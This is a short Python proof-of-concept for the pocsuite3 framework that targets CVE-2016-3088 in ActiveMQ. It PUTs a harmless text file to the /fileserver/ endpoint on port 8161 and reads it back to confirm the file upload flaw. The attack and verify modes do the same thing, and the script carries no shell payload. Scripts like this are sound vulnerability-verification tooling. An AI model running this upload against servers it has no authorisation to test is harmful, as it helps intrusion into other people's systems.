# -*- coding: utf-8 -*-
# author: seven
# upload file in menu fileserver
from pocsuite3.api import register_poc, POCBase, Output,logger,POC_CATEGORY,requests
from pocsuite3.lib.core.threads import run_threads


class ActiveMQFileUploadPOC(POCBase):
    vulID = 'CVE-2016-3088'
    version = '1.0'
    author = ['seven']
    vulDate = 'Aug 7, 2020'
    createDate = 'Aug 7, 2020'
    name = 'activeMQ未见上传'
    appName = 'activeMQ'
    appVersion = 'v1.0.0'
    vulType = '文件上传'
    protocol = 'http'

    def parse_output(self, result):
        output = Output(self)
        if result:
            output.success(result)
        else:
            output.fail('target is not vulnerable')
        return output
    def _verify(self):
        host = self.getg_option("rhost")
        port = self.getg_option("rport") or 8161
        result = {}
        url = f'http://{host}:{port}'
        filename = 'sgvvv.txt'
        data = 'gzfadfad'
        if upload_file(url,filename,data) and check_upload_success(url,filename,data):
            result['VerifyInfo'] = {}
            result['VerifyInfo']['URL'] = self.url
            result['extra'] = filename
        return self.parse_output(result)
    def _attack(self):
        return self._verify()

def upload_file(url,filename,data):
    url = url + '/fileserver/'+filename
    try:
        res = requests.put(url,data=data)
        if  res.status_code == 204:
            logger.info(f'uploadfile {filename} success')
            return True
    except:
        pass
    logger.info(f'uploadfile {filename} fail')
    return False

def check_upload_success(url,filename,data):
    url = url + '/fileserver/'+filename
    try:
        res = requests.get(url)
        if not res.status_code == 200:
            return False
        if data in res.text:
            return True
    except:
        pass
    return False

register_poc(ActiveMQFileUploadPOC)